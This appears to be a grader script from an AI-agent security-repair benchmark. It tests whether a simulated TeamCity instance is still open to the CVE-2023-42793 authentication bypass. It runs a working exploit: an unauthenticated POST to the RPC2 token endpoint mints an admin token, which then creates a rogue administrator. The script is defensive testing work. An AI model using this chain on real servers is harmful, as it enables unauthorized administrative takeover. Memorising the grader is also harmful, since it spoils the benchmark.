#!/bin/bash
# Scenario 16: TeamCity auth-bypass -> admin token -> RCE (SIMULATION of
# CVE-2023-42793). Ground truth is BEHAVIOURAL against the LIVE service: the real
# exploit chain (mint an admin token unauthenticated, then use it to create a new
# administrator) must SUCCEED at baseline and be BLOCKED after the fix. A
# do-nothing agent leaves the chain working.
#
# Two-component protocol: each check is recorded with its kind and NOTHING
# aborts early, so "closed the bypass but killed TeamCity" is reported as
# security_pass=true / regression_pass=false rather than collapsing into a bare
# exit 1. See lib/verifylib.sh.
set -u

# The guard is load-bearing: under the harness scorer.py has already inlined the
# library and set this, so the agent-writable /tmp path is never read.
[ -n "${_SYSREPAIR_VERIFYLIB_LOADED:-}" ] || . "${SYSREPAIR_VERIFYLIB:-/tmp/verifylib.sh}"

IP=$(hostname -i 2>/dev/null | awk '{print $1}')
[ -z "$IP" ] && IP=127.0.0.1
B="http://$IP:8111"

code_of() { curl -s -m 5 -o /dev/null -w '%{http_code}' "$@" 2>/dev/null || echo 000; }

###############################################################################
# Regression: the service must already be up (do NOT start it).
###############################################################################
UP=0
for i in $(seq 1 20); do
    [ "$(code_of "$B/")" != "000" ] && { UP=1; break; }
    sleep 2
done
if [ "$UP" = "1" ]; then
    record_reg service_up 1
else
    record_reg service_up 0 "nothing serving on 8111 (dead / not started)"
fi

ROGUE="hv_rogue_admin"

###############################################################################
# PoC: run the REAL auth-bypass -> privileged-action chain.
#   1) mint an admin token WITHOUT authentication
#   2) use the token to create a new administrator
#   3) confirm the new administrator now exists in server state
###############################################################################
TOKRESP=$(curl -s -m 5 -X POST "$B/app/rest/users/id:1/tokens/RPC2" 2>/dev/null || true)
TOKEN=$(printf '%s' "$TOKRESP" | grep -oE '[0-9a-f]{32}' | head -1 || true)

if [ -n "$TOKEN" ]; then
    curl -s -m 5 -X POST "$B/app/rest/users" \
        -H "Authorization: Bearer $TOKEN" \
        --data "username=$ROGUE" >/dev/null 2>&1 || true
fi

USERSLIST=$(curl -s -m 5 "$B/app/rest/users" 2>/dev/null || true)
if printf '%s' "$USERSLIST" | grep -q "$ROGUE"; then
    record_poc unauth_admin_creation_blocked 0 "unauth token minted and used to create admin '$ROGUE' - CVE-2023-42793 exploitable (state: $USERSLIST)"
elif [ -n "$TOKEN" ]; then
    record_poc unauth_admin_creation_blocked 1 "token minted but privileged action denied; admin set unchanged ($USERSLIST)"
else
    record_poc unauth_admin_creation_blocked 1 "unauth token generation refused; admin set unchanged ($USERSLIST)"
fi

###############################################################################
# Regression: the TeamCity web UI must still respond.
###############################################################################
UI=0
for i in 1 2 3 4 5; do
    if [ "$(code_of "$B/")" = "200" ]; then
        UI=1
        break
    fi
    sleep 2
done
if [ "$UI" = "1" ]; then
    record_reg teamcity_ui_reachable 1
else
    record_reg teamcity_ui_reachable 0 "TeamCity UI not reachable on 8111"
fi

verify_finish
